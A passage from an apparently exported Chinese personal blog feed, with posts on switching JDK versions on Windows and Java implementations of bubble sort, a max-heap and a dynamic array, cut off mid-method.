<li><h4 id="变量名：Path"><a href="#变量名：Path" class="headerlink" title="变量名：Path"></a>变量名：Path</h4></li>
<li><h4 id="变量值：-JAVA-HOME-bin-JAVA-HOME-jre-bin"><a href="#变量值：-JAVA-HOME-bin-JAVA-HOME-jre-bin" class="headerlink" title="变量值：%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;"></a>变量值：%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;</h4></li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210706201827607.png" alt="image-20210706201827607"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210705155100847.png" alt="image-20210705155100847"></p>
</li>
</ul>
</li>
<li><h2 id="三、查看jdk版本进行混合使用"><a href="#三、查看jdk版本进行混合使用" class="headerlink" title="三、查看jdk版本进行混合使用"></a>三、查看jdk版本进行混合使用</h2><ul>
<li><h3 id="1、打开cmd"><a href="#1、打开cmd" class="headerlink" title="1、打开cmd"></a>1、打开cmd</h3><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210705155235159.png" alt="image-20210705155235159"></li>
</ul>
</li>
<li><h3 id="2、java-–version-（查看16版本）"><a href="#2、java-–version-（查看16版本）" class="headerlink" title="2、java –version （查看16版本）"></a>2、java –version （查看16版本）</h3><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210705155305520.png" alt="image-20210705155305520"></li>
</ul>
</li>
<li><h3 id="3、想换jdk8很简单，只需要一步"><a href="#3、想换jdk8很简单，只需要一步" class="headerlink" title="3、想换jdk8很简单，只需要一步"></a>3、想换jdk8很简单，只需要一步</h3><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210705155428594.png" alt="image-20210705155428594"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210705155519059.png" alt="image-20210705155519059"></li>
</ul>
</li>
<li><h3 id="4、java-version（看8版本）"><a href="#4、java-version（看8版本）" class="headerlink" title="4、java -version（看8版本）"></a>4、java -version（看8版本）</h3><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210705155602270.png" alt="image-20210705155602270"></li>
</ul>
</li>
<li><h2 id="5、结束"><a href="#5、结束" class="headerlink" title="5、结束"></a>5、结束</h2></li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>JAVA</tag>
        <tag>版本共存</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-冒泡排序（完整代码）</title>
    <url>/posts/50.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="冒泡排序执行截图"><a href="#冒泡排序执行截图" class="headerlink" title="冒泡排序执行截图"></a>冒泡排序执行截图</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210630154602731.png" alt="image-20210630154602731"></p>
<h1 id="冒泡排序执行（完整代码）"><a href="#冒泡排序执行（完整代码）" class="headerlink" title="冒泡排序执行（完整代码）"></a>冒泡排序执行（完整代码）</h1><h2 id="Bubble-java（冒泡排序）"><a href="#Bubble-java（冒泡排序）" class="headerlink" title="Bubble.java（冒泡排序）"></a>Bubble.java（冒泡排序）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BubbleSort</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">BubbleSort</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(E[] data)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i + <span class="number">1</span> &lt; data.length; i ++)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// arr[ n - i , n] 已经排好序</span></span><br><span class="line">            <span class="comment">// 通过冒泡在 arr[n - i - 1 ] 位置放上合适的元素</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span> ;  j  &lt; data.length - i - <span class="number">1</span>; j ++ )</span><br><span class="line">                <span class="comment">// j , j + 1</span></span><br><span class="line">                <span class="keyword">if</span>(data[j].compareTo(data[j + <span class="number">1</span>])&gt; <span class="number">0</span>)</span><br><span class="line">                    swap(data, j , j +<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;E&gt; <span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(E[] arr, <span class="keyword">int</span> i , <span class="keyword">int</span> j )</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        E t = arr[i];</span><br><span class="line">        arr[i] = arr[j];</span><br><span class="line">        arr[j] = t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">100000</span>;</span><br><span class="line">        Integer[] arr1 = ArrayGenerator.generateRandomArray(n, n);</span><br><span class="line">        Integer[] arr2 = Arrays.copyOf(arr1, arr1.length);</span><br><span class="line">        sort(arr2);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n ; i ++)</span><br><span class="line">            System.out.println(arr2[i]);</span><br><span class="line">        SortingHelper.sortTest(<span class="string">"BubbleSort"</span>,arr1);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="SortingHelper-java（辅助进行算法时间输出的）"><a href="#SortingHelper-java（辅助进行算法时间输出的）" class="headerlink" title="SortingHelper.java（辅助进行算法时间输出的）"></a>SortingHelper.java（辅助进行算法时间输出的）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SortingHelper</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SortingHelper</span><span class="params">()</span></span>&#123;&#125; <span class="comment">//私有类</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">boolean</span> <span class="title">isSorted</span><span class="params">(E[] arr)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i&lt; arr.length; i++)</span><br><span class="line">            <span class="keyword">if</span> (arr[i - <span class="number">1</span>].compareTo(arr[i]) &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sortTest</span><span class="params">(String sortname, E[] arr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">long</span> startTime = System.nanoTime();</span><br><span class="line">        <span class="keyword">if</span>(sortname.equals(<span class="string">"SelectionSort"</span>)) &#123;</span><br><span class="line">            SelectionSort.sort(arr);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"InsertionSort"</span>))</span><br><span class="line">            InsertionSort.sort(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"InsertionSort2"</span>))</span><br><span class="line">            InsertionSort.sort2(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"MergeSort"</span>))</span><br><span class="line">            MergeSort.sort(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"MergeSort2"</span>))</span><br><span class="line">            MergeSort.sort2(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"MergeSort3"</span>))</span><br><span class="line">            MergeSort.sort3(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"MergeSort4"</span>))</span><br><span class="line">            MergeSort.sort4(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"MergeSortBU"</span>))</span><br><span class="line">            MergeSort.sortBU(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"QuickSort"</span>))</span><br><span class="line">            QuickSort.sort(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"QuickSort2"</span>))</span><br><span class="line">            QuickSort.sort2ways(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"QuickSort3"</span>))</span><br><span class="line">            QuickSort.sort3ways(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"HeapSort"</span>))</span><br><span class="line">            HeapSort.sort(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"BubbleSort"</span>))</span><br><span class="line">            BubbleSort.sort(arr);</span><br><span class="line">        <span class="keyword">long</span> endTime = System.nanoTime();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">double</span> time = (endTime - startTime) / <span class="number">1000000000.0</span>; <span class="comment">//纳米要/9个零</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!SortingHelper.isSorted(arr))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(sortname + <span class="string">"failed"</span>);</span><br><span class="line">        System.out.println(String.format(<span class="string">"%s , n = %d : %f s "</span>, sortname, arr.length, time));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="ArrayGenerator-java（辅助测试用例的，生成随机的一组数组或有序的一组数组）"><a href="#ArrayGenerator-java（辅助测试用例的，生成随机的一组数组或有序的一组数组）" class="headerlink" title="ArrayGenerator.java（辅助测试用例的，生成随机的一组数组或有序的一组数组）"></a>ArrayGenerator.java（辅助测试用例的，生成随机的一组数组或有序的一组数组）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayGenerator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">ArrayGenerator</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Integer[] generateOrderedArray(<span class="keyword">int</span> n)&#123;</span><br><span class="line"></span><br><span class="line">       Integer[] arr = <span class="keyword">new</span> Integer[n];</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n ; i++)</span><br><span class="line">           arr[i] = i;</span><br><span class="line">       <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生成一个长度为 n 的随机数组， 每个数字的范围是[ 0 , bound)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Integer[] generateRandomArray(<span class="keyword">int</span> n, <span class="keyword">int</span> bound)&#123;</span><br><span class="line"></span><br><span class="line">        Integer[] arr = <span class="keyword">new</span> Integer[n];</span><br><span class="line">        Random rnd = <span class="keyword">new</span> Random();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n; i++)</span><br><span class="line">            arr[i] = rnd.nextInt(bound); <span class="comment">//从0到bound前闭后开</span></span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>堆排序</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-堆排序（完整代码）</title>
    <url>/posts/49.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="堆排序和其他排序算法时间复杂度比较截图"><a href="#堆排序和其他排序算法时间复杂度比较截图" class="headerlink" title="堆排序和其他排序算法时间复杂度比较截图"></a>堆排序和其他排序算法时间复杂度比较截图</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210630150821902.png" alt="image-20210630150821902"></p>
<h1 id="堆排序执行（完整代码）"><a href="#堆排序执行（完整代码）" class="headerlink" title="堆排序执行（完整代码）"></a>堆排序执行（完整代码）</h1><h2 id="MaxHeap-java（最大堆数据结构）"><a href="#MaxHeap-java（最大堆数据结构）" class="headerlink" title="MaxHeap.java（最大堆数据结构）"></a>MaxHeap.java（最大堆数据结构）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MaxHeap</span>&lt;<span class="title">E</span> <span class="keyword">extends</span> <span class="title">Comparable</span>&lt;<span class="title">E</span>&gt;&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Array&lt;E&gt; data;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MaxHeap</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">        data = <span class="keyword">new</span> Array&lt;&gt;(capacity);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MaxHeap</span><span class="params">()</span></span>&#123;</span><br><span class="line">        data  = <span class="keyword">new</span> Array&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回堆中的元素个数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data.getSize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回一个布尔值，表示堆中是否为空</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回完全二叉树的数组表示中，一个索引所表示的元素的父亲节点的索引</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span>  <span class="title">parent</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"index-0 doesn't have parent."</span>);</span><br><span class="line">        <span class="keyword">return</span> (index - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回完全二叉树的数组表示中，一个索引所表示的元素的左孩子节点的索引</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">leftChild</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> index * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回完全二叉树的数组表示中，一个索引所表示的元素右孩子节点的索引</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">rightchild</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> index * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向堆中添加元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        data.addLast(e);</span><br><span class="line">        siftUp(data.getSize()- <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftUp</span><span class="params">(<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(k &gt; <span class="number">0</span> &amp;&amp; data.get(parent(k)).compareTo(data.get(k)) &lt; <span class="number">0</span> )&#123;</span><br><span class="line">            data.swap(k , parent(k));</span><br><span class="line">            k = parent(k);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 看堆中的最大元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">findMax</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(data.getSize()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"can not findMax when heap is empty!"</span>);</span><br><span class="line">        <span class="keyword">return</span> data.get(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取出堆中最大元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">extractMax</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        E ret = findMax();</span><br><span class="line"></span><br><span class="line">        data.swap(<span class="number">0</span>, data.getSize()-<span class="number">1</span>);</span><br><span class="line">        data.removeLast();</span><br><span class="line">        siftDown(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDown</span><span class="params">(<span class="keyword">int</span> k )</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(leftChild(k) &lt; data.getSize() )&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> j = leftChild(k);</span><br><span class="line">            <span class="keyword">if</span>(j + <span class="number">1</span> &lt; data.getSize() &amp;&amp; data.get(j+<span class="number">1</span>).compareTo(data.get(j))&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                j = rightchild(k);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//data[j] 是左右孩子中最大值</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(data.get(k).compareTo(data.get(j)) &gt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            data.swap(k,j);</span><br><span class="line">            k = j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Array-java-堆使用的自定义动态数组"><a href="#Array-java-堆使用的自定义动态数组" class="headerlink" title="Array.java(堆使用的自定义动态数组)"></a>Array.java(堆使用的自定义动态数组)</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Array</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> E[] data;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;  <span class="comment">//大小</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数 转入数组的容量capacity构造Array</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Array</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">        data =(E[])<span class="keyword">new</span> Object[capacity];</span><br><span class="line">        size = <span class="number">0</span>    ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 无参的构造函数，默认数组的容量capacity = 10</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Array</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(<span class="number">10</span>); <span class="comment">//调用有参构造函数传入10设定初始大小</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取数组中元素个数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取数组的容量</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCapacity</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data.length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//返回数组是否为空</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向所有元素后添加一个新元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addLast</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//         if(size == data.length) &#123;</span></span><br><span class="line"><span class="comment">//             throw new IllegalArgumentException("AddLast failed. Array is full.");</span></span><br><span class="line"><span class="comment">//         &#125;</span></span><br><span class="line"><span class="comment">//         data[size] = e;</span></span><br><span class="line"><span class="comment">//         size ++;</span></span><br><span class="line">        add(size, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在所有元素前添加一个新元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addFirst</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        add(<span class="number">0</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在第index个位置插入一个新元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt; size )&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Add failed. Require index &gt;=0 and index &lt;= size."</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(size == data.length) &#123;</span><br><span class="line">            resize(<span class="number">2</span> * data.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = size - <span class="number">1</span> ; i &gt;= index ; i  --)&#123;</span><br><span class="line">            data[i + <span class="number">1</span>]=data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        data[index] = e;</span><br><span class="line">        size ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取index索引位置的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Get failed. Index is illegal."</span>);</span><br><span class="line">        <span class="keyword">return</span> data[index];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改index索引位置的元素为e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"set failed. Index is illegal."</span>);</span><br><span class="line">        data[index] = e;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找数组中是否有元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(data[i].equals(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找数组中元素e所在的索引，如果不存在元素e，则返回-1</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(data[i].equals(e))</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除index位置的元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Remove failed. Index is illegal."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        E ret = data[index];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = index + <span class="number">1</span> ; i &lt; size ; i ++)</span><br><span class="line">        &#123;</span><br><span class="line">            data[i-<span class="number">1</span>] = data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        size --;</span><br><span class="line">        data[size] = <span class="keyword">null</span>; <span class="comment">//让他自动回收 非必须写  loitering objects ！= memory leak</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(size == data.length / <span class="number">4</span> &amp;&amp; data.length / <span class="number">2</span> != <span class="number">0</span>)</span><br><span class="line">            resize(data.length / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除第一个元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除最后一个元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeLast</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(size-<span 